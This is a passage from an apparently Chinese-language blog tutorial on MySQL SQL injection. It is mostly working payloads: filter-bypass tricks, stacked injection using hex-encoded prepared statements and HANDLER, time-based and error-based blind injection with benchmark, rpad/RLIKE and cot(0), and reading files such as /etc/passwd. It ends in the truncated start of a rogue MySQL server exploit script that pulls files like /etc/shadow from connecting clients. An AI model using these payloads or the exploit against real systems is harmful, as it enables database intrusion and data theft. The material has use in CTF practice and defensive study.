PI() | 返回π的具体数值。  
REGEXP “statement” | 正则匹配数据，返回值为布尔值。  
LIKE “statement” | 匹配数据，%代表任意内容。返回值为布尔值。  
RLIKE “statement” | 与regexp相同。  
LOCATE(substr,str,[pos]) | 返回子字符串第一次出现的位置。  
POSITION(substr IN str) | 等同于 `LOCATE()`。  
LOWER(str) | 将字符串的大写字母全部转成小写。同：`LCASE(str)`。  
UPPER(str) | 将字符串的小写字母全部转成大写。同：`UCASE(str)`。  
ELT(N,str1,str2,str3,…) | 与`MAKE_SET(bit,str1,str2...)`类似，根据`N`返回参数值。  
NULLIF(expr1,expr2) | 若expr1与expr2相同，则返回expr1，否则返回NULL。  
CHARSET(str) | 返回字符串使用的字符集。  
DECODE( _crypt_str_ , _pass_str_ ) | 使用 pass_str 作为密码，解密加密字符串
crypt_str。加密函数：`ENCODE(str,pass_str)`。  
###  7.逗号被过滤
**用join代替：**  
-1 union select 1,2,3  
-1 union select * from (select 1)a join (select 2)b join (select 3)c%23
**limit：**  
limit 2,1  
limit 1 offset 2
**substr:**  
substr(database(),5,1)  
substr(database() from 5 for 1) from为从第几个字符开始，for为截取几个  
substr(database() from 5)  
如果for也被过滤了  
mid(REVERSE(mid(database()from(-5)))from(-1)) reverse是反转，mid和substr等同
**if:**  
if(database()=’xxx’,sleep(3),1)  
id=1 and databse()=’xxx’ and sleep(3)  
select case when database()=’xxx’ then sleep(5) else 0 end
### **8.limit被过滤**
select user from users limit 1
加限制条件，如：
select user from users group by user_id having user_id = 1
(user_id是表中的一个column)
###  9.information_schema被过滤
innodb引擎可用mysql.innodb_table_stats、innodb_index_stats，日志将会把表、键的信息记录到这两个表中
除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema
###  10.and or && ||被过滤
可用运算符! ^ ~以及not xor来代替：
例如：
    真^真^真=真
    真^假^真=假
    真^(!(真^假))=假
    ……
等等一系列组合
eg: select bbb from table1 where
‘29’=’29’^if(ascii(substr(database(),1,1))>0,sleep(3),0)^1;
真则sleep(3)，假则无时延
## 三、特定场景的绕过
###  1.表名已知字段名未知的注入
**join注入得到列名：**
条件：有回显（本地尝试了下貌似无法进行时间盲注，如果有大佬发现了方法可以指出来）
第一个列名：
    select * from(select * from table1 a join (select * from table1)b)c
第二个列名：
    select * from(select * from table1 a join (select * from table1)b using(balabala))c
第三个列名：
    select * from(select * from table1 a join (select * from table1)b using(balabala,eihey))c
以此类推……
在实际应用的的过程中，该语句可以用于 **判断条件中** ：
类似于select xxx from xxx where ‘1’=’1’ and 语句=’a’
**join利用别名直接注入：**
上述获取列名需要有回显，其实 **不需要知道列名即可获取字段内容** ：
采用别名：union select 1,(select b.2 from (select 1,2,3,4 union select * from
table1)b limit 1,1),3
该语句即把(select 1,2,3,4 union select * from users)查询的结果作为表b，然后从表b的第1/2/3/4列查询结果
当然，1,2,3,4的数目要根据表的列名的数目来确定。
    select * from table1 where '1'='' or if(ascii(substr((select b.2 from (select 1,2,3,4 union select * from table1)b limit 3,1),1,1))>1,sleep(3),0)
###  2.堆叠注入&select被过滤
select被过滤一般只有在堆叠注入的情况下才可以绕过，除了极个别不需要select可以直接用password或者flag进行查询的情况
在堆叠注入的场景里，最常用的方法有两个：
**1.预编译：**
没错，预编译除了防御SQL注入以外还可以拿来执行SQL注入语句，可谓双刃剑：
    id=1';Set @x=0x31;Prepare a from “select balabala from table1 where 1=?”;Execute a using @x;
或者：
    set @x=0x73656c6563742062616c6162616c612066726f6d207461626c653120776865726520313d31;prepare a from @x;execute a;
上面一大串16进制是select balabala from table1 where 1=1的16进制形式
**2.Handler查询**
Handler是Mysql特有的轻量级查询语句，并未出现在SQL标准中，所以SQL Server等是没有Handler查询的。
Handler查询的用法：
handler table1 open as fuck;//打开句柄
handler fuck read first;//读所有字段第一条
handler fuck read next;//读所有字段下一条
……
handler fuck close;//关闭句柄
###  3.PHP正则回溯BUG
PHP为防止正则表达式的DDos，给pcre设定了回溯次数上限，默认为100万次，超过这个上限则未匹配完，则直接返回False。
例如存在preg_match(“/union.+?select/ig”,input)的过滤正则，则我们可以通过构造
    union/*100万个1*/select
即可绕过。
###  4.PDO场景下的SQL注入
PDO最主要有下列三项设置：
    PDO::ATTR_EMULATE_PREPARES
    PDO::ATTR_ERRMODE
    PDO::MYSQL_ATTR_MULTI_STATEMENTS
第一项为模拟预编译，如果为False，则不存在SQL注入；如果为True，则PDO并非真正的预编译，而是将输入统一转化为字符型，并转义特殊字符。这样如果是gbk编码则存在宽字节注入。
第二项为报错，如果设为True，可能会泄露一些信息。
第三项为多句执行，如果设为True，且第一项也为True，则会存在宽字节+堆叠注入的双重大漏。
详情请查看我的另一篇文章：
[从宽字节注入认识PDO的原理和正确使用](https://anylike.top/article?id=14)
###  5.Limit注入（5.7版本已经废除）
适用于5.0.0-5.6.6版本
如果存在一条语句为
    select bbb from table1 limit 0,1
后面接可控参数，则可在后面接union select：
    select bbb from table1 limit 0,1 union select database();
如果查询语句加入了order by：
    select bbb from table1 order by balabala limit 0,1
，则可用如下语句注入：
    select bbb from table1 order by balabala limit 0,1 PROCEDURE analyse(1,1)
其中1可换为其他盲注的语句
###  6.特殊的盲注
**（1）查询成功与mysql error**
与普通的布尔盲注不同，这类盲注只会回显执行成功和mysql error，如此只能通过可能会报错的注入来实现，常见的比较简单的报错函数有：
    整数溢出：cot(0), pow(999999,999999), exp(710)
    几何函数：polygon(ans), linestring(ans)
因此可以按照下面的逻辑来构造语句：
parameter=1 and 语句 or cot(0)
若语句为真，则返回正确结果并忽略后面的cot(0)；语句为假，则执行后面的cot(0)报错
无回显的情况：
    select * from table1 where 1=1 and if(mid(user(),1,1)='r',benchmark(10000000,sha1(1)),1) and cot(0);
    或
    select * from table1 where 1=1 and if(mid(user(),1,1)='r',concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd',1) and cot(0);
用rpad+rlike以及benchmark的时间盲注可以成功，但是sleep()不可以，不太清楚原因。
**（2）mysql error的前提下延时与不延时**
这个看起来有点别扭，就是不管查询结果对还是不对，一定要mysql error
还是感觉很别扭吧……网鼎杯web有道题就是这样的场景，insert注入但是只允许插入20条数据，所以不得不构造mysql
error来达到在不插入数据的条件下盲注的目的。详情见[网鼎杯Writeup+闲扯](https://anylike.top/article?id=15)
有个很简单的方法当时没有想到，就是上面rpad+rlike的时间盲注，因为当时sleep测试是没法盲注的，但是没有测试rpad+rlike的情况，这个方法就是：
假 or if(语句,rpad延时语句=’a’,1) and cot(0)
这样，无论语句是真是假，都会向后执行cot(0)，必然报错
如果语句为真，则延时，如果语句为假，则不延时，这就完美的达到了目的
payload：
    select * from table1 where 1=0 or if(mid(user(),1,1)='s','a'=benchmark(1000000,sha1(1)),1) and cot(0);
    或
    select * from table1 where 1=0 or if(mid(user(),1,1)='s','a'=concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd',1) and cot(0);
当然，比赛时想到的用sleep()的方法也是可以的。
上面提到cot(0)会报错，即cot(False)会报错，所以只要让内部为False则必定会执行
并且我们知道sleep(x)的返回值为0：
这样就很好办了，if(语句,sleep(3),0)，这样语句不管为真还是假都返回False
所以构造语句
    select * from table1 where '1'='1' and cot(if(ascii(substr(database(),1,1))>0,sleep(3),0));
**（3）表名未知**
表名未知只能去猜表名，通过构造盲注去猜测表名，这里不再过多赘述。
## 四.文件的读写
**1.读写权限**
在进行MySQL文件读写操作之前要先查看是否拥有权限，mysql文件权限存放于mysql表的file_priv字段，对应不同的User，如果可以读写，则数据库记录为Y，反之为N：
我们可以通过user()查看当前用户是什么，如果对应用户具有读写权限，则往下看，反之则放弃这条路找其他的方法。
除了要查看用户权限，还有一个地方要查看，即 **secure-file-priv** 。它是一个系统变量，用于限制读写功能，它的值有三种：
（1）无内容，即无限制
（2）为NULL，表示禁止文件读写
（3）为目录名，表示仅能在此目录下读写
可用select @[@secure_file_priv](https://github.com/secure_file_priv
"@secure_file_priv")查看：
此处为Windows环境，可以读写的目录为E:wamp64tmp
**2.读文件**
如果满足上述2个条件，则可尝试读写文件了。
常用的读文件的语句有如下几种：
    select load_file(file_path);
    load data infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n'; #读取服务端文件
    load data local infile "/etc/passwd" into table 库里存在的表名 FIELDS TERMINATED BY 'n'; #读取客户端文件
需要注意的是，file_path必须为绝对路径，且反斜杠需要转义：
**3.mysql任意文件读取漏洞**
攻击原理详见：
exp：
摘自：
下面filelist是需要读取的文件列表，需要自行设置，该漏洞需要一个恶意mysql服务端，执行exp监听恶意mysql服务的对应端口，在目标服务器登录恶意mysql服务端
    #!/usr/bin/env python
    #coding: utf8
    import socket
    import asyncore
    import asynchat
    import struct
    import random
    import logging
    import logging.handlers
    PORT = 3306
    log = logging.getLogger(__name__)
    log.setLevel(logging.DEBUG)
    tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
    tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
    log.addHandler(
        tmp_format
    )
    filelist = (
    #    r'c:boot.ini',
        r'c:windowswin.ini',
    #    r'c:windowssystem32driversetchosts',
    #    '/etc/passwd',
    #    '/etc/shadow',
    )
    #================================================
    #=======No need to change after this lines=======
    #================================================
    __author__ = 'Gifts'
    def daemonize():
        import os, warnings
        if os.name != 'posix':
            warnings.warn('Cant create daemon on non-posix system')
            return
        if os.fork(): os._exit(0)